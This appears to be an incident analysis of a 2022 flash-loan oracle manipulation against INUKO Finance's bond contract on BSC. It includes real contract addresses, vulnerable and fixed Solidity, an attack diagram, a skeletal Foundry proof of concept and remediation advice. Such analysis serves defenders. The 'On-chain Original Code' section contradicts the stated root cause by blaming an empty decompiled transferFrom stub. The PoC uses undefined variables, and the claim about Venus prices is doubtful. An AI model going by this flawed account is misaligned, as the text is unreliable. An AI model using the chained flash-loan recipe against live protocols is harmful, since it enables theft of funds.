# INUKO — Bond Flash Loan Oracle Manipulation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | INUKO Finance (Bond) |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed (INUKO tokens) |
| **INUKO Token** | [0xEa51801b8F5B88543DdaD3D1727400c15b209D8f](https://bscscan.com/address/0xEa51801b8F5B88543DdaD3D1727400c15b209D8f) |
| **Bond Contract** | [0x09beDDae85a9b5Ada57a5bd7979bb7b3dd08B538](https://bscscan.com/address/0x09beDDae85a9b5Ada57a5bd7979bb7b3dd08B538) |
| **Unitroller** | [0xfD36E2c2a6789Db23113685031d7F16329158384](https://bscscan.com/address/0xfD36E2c2a6789Db23113685031d7F16329158384) |
| **INUKO/USDT Pair** | [0xD50B9Bcd8B7D4B791EA301DBCC8318EE854d8B67](https://bscscan.com/address/0xD50B9Bcd8B7D4B791EA301DBCC8318EE854d8B67) |
| **vBNB** | [0xA07c5b74C9B40447a954e1466938b865b6BBea36](https://bscscan.com/address/0xA07c5b74C9B40447a954e1466938b865b6BBea36) |
| **vBUSD** | [0x95c78222B3D6e262426483D42CfA53685A67Ab9D](https://bscscan.com/address/0x95c78222B3D6e262426483D42CfA53685A67Ab9D) |
| **vETH** | [0xf508fCD89b8bd15579dc79A6827cB4686A3592c8](https://bscscan.com/address/0xf508fCD89b8bd15579dc79A6827cB4686A3592c8) |
| **vBTC** | [0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B](https://bscscan.com/address/0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B) |
| **vUSDT** | [0xfD5840Cd36d94D7229439859C0112a4185BC0255](https://bscscan.com/address/0xfD5840Cd36d94D7229439859C0112a4185BC0255) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **Root Cause** | The bond price calculation in `buyBond()` relies on `Unitroller.getUnderlyingPrice()` (Venus internal LP spot price), which can be manipulated via large deposits — no independent external oracle is used |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/INUKO_exp.sol) |

---
## 1. Vulnerability Overview

INUKO Finance's bond system used Venus Protocol's LP token price as the collateral valuation oracle. The attacker chained eight DODO flash loans to borrow BNB, BUSD, ETH, and BTCB, deposited them into Venus, and borrowed USDT. This process manipulated the Venus LP price oracle, causing `buyBond()` to issue INUKO bonds at an excessively cheap price. Three days later, after the bonds matured, the attacker withdrew the INUKO tokens, swapped them for USDT, and realized the profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable buyBond() — uses Venus LP spot price
contract INUKOBond {
    IUnitroller unitroller; // Venus controller

    function buyBond(uint256 lpAmount) external {
        // ❌ Collateral value assessed using current Venus LP token price
        // LP price can be manipulated by depositing large amounts into Venus via flash loan
        uint256 lpPrice = unitroller.getUnderlyingPrice(vToken);
        uint256 bondAmount = lpAmount * lpPrice / BOND_PRICE;

        IERC20(lpToken).transferFrom(msg.sender, address(this), lpAmount);
        // ❌ Excessive bondAmount issued based on manipulated lpPrice
        pendingBonds[msg.sender] += bondAmount;
        bondExpiry[msg.sender] = block.timestamp + 3 days;
    }

    function claimBond() external {
        require(block.timestamp >= bondExpiry[msg.sender], "Not mature");
        uint256 amount = pendingBonds[msg.sender];
        pendingBonds[msg.sender] = 0;
        INUKO.transfer(msg.sender, amount);
    }
}

// ✅ Correct pattern — use TWAP or external oracle
contract SafeINUKOBond {
    AggregatorV3Interface chainlinkFeed;

    function buyBond(uint256 lpAmount) external {
        // ✅ Use manipulation-resistant external oracle price
        (, int256 price, , uint256 updatedAt, ) = chainlinkFeed.latestRoundData();
        require(block.timestamp - updatedAt <= 3600, "Stale oracle");
        uint256 bondAmount = lpAmount * uint256(price) / BOND_PRICE;
        // ...
    }
}
```

---
### On-chain Original Code

Source: Bytecode decompiled


**INUKO_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: the bond price calculation in `buyBond()` relies on `Unitroller.getUnderlyingPrice()` (Venus internal LP spot price), which can be manipulated via large deposits
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Create INUKO/USDT LP tokens with 5 BNB
    │
    ├─[2] Chain 8 DODO flash loans
    │       DODO1 → DODO2 → ... → DODO8
    │       Borrow BNB, BUSD, ETH, BTCB from each pool
    │
    ├─[3] Deposit collateral into Venus
    │       Receive vBNB, vBUSD, vETH, vBTC
    │       → Venus LP token price rises (TVL increases from large deposit)
    │
    ├─[4] Borrow USDT from Venus
    │       Call venusLendingAndRepay() function
    │
    ├─[5] Call buyBond(lpAmount)
    │       ❌ Purchase excess INUKO bonds at manipulated Venus LP price
    │       bondExpiry = now + 3 days
    │
    ├─[6] Repay Venus loan + repay 8 flash loans in reverse order
    │
    ├─[7] After 3 days, withdraw INUKO via claimBond()
    │
    └─[8] Sell INUKO → USDT to realize profit
              vm.warp(+3 days) used to simulate maturity
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IINUKOBond {
    function buyBond(uint256 lpAmount) external;
    function claimBond() external;
}

interface IDODO {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IVToken {
    function mint(uint256) external returns (uint256);
    function borrow(uint256) external returns (uint256);
    function repayBorrow(uint256) external returns (uint256);
    function redeem(uint256) external returns (uint256);
}

contract INUKOExploit is Test {
    IINUKOBond bond = IINUKOBond(0x09beDDae85a9b5Ada57a5bd7979bb7b3dd08B538);
    // 8 DODO pools (dodo1~dodo8)
    IDODO[8] dodos;

    function setUp() public {
        vm.createSelectFork("bsc", 22_169_169);
        vm.deal(address(this), 5 ether);
    }

    function testExploit() public {
        // [Step 1] Create INUKO/USDT LP

        // [Step 2] Chain 8 DODO flash loans
        // Nested structure where each flashLoan calls the next DODO
        dodos[0].flashLoan(0, largeAmount, address(this), abi.encode(1));
    }

    function DPPFlashLoanCall(address, uint256, uint256 amount, bytes calldata data) external {
        uint256 step = abi.decode(data, (uint256));

        if (step < 8) {
            // Call next DODO flash loan (nested)
            dodos[step].flashLoan(0, amount * 2, address(this), abi.encode(step + 1));
        } else {
            // [Step 3] Deposit collateral into Venus → LP price rises
            // vBNB.mint(), vBUSD.mint(), etc.

            // [Step 4] buyBond() — purchase INUKO bonds at manipulated price
            // ⚡ Venus LP price is in a manipulated state
            bond.buyBond(lpBalance);

            // [Step 5] Repay Venus loan
        }

        // Repay to parent DODO
    }

    // After 3 days:
    function claimAfterExpiry() public {
        vm.warp(block.timestamp + 3 days);
        bond.claimBond(); // Withdraw INUKO
        // Sell INUKO → USDT
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Venus LP oracle manipulation + bond price distortion |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **OWASP DeFi** | Compound flash loan + oracle manipulation |
| **Attack Vector** | 8 DODO chained flash loans → Venus collateral manipulation → `buyBond()` |
| **Precondition** | Bond price calculation uses Venus LP spot price |
| **Impact** | Excess INUKO token issuance |

---
## 6. Remediation Recommendations

1. **Independent External Oracle**: Switch bond price calculation to an independent price feed such as Chainlink.
2. **Bond Price Cap/Floor**: Set an upper limit on the quantity of bonds purchasable in a single transaction.
3. **Post-Purchase Cooldown**: Set a sufficient lock-up period to prevent bonds from maturing immediately after purchase.

---
## 7. Lessons Learned

- **8 Chained Flash Loans**: A technique that makes nested calls to multiple pools to exceed the limit of a single DODO flash loan. Flash loan defenses must account for nested flash loans, not just single-pool scenarios.
- **Manipulability of Venus LP Prices**: Internal LP prices in lending protocols like Venus can be temporarily inflated by large deposits. Using these as an oracle introduces vulnerability to flash loan attacks.
- **3-Day Bond Maturity**: A longer maturity period forces the attacker to wait 3 days after repaying the flash loans. This window gives the project team an opportunity to intervene, but attackers only execute when the trade remains profitable despite the delay.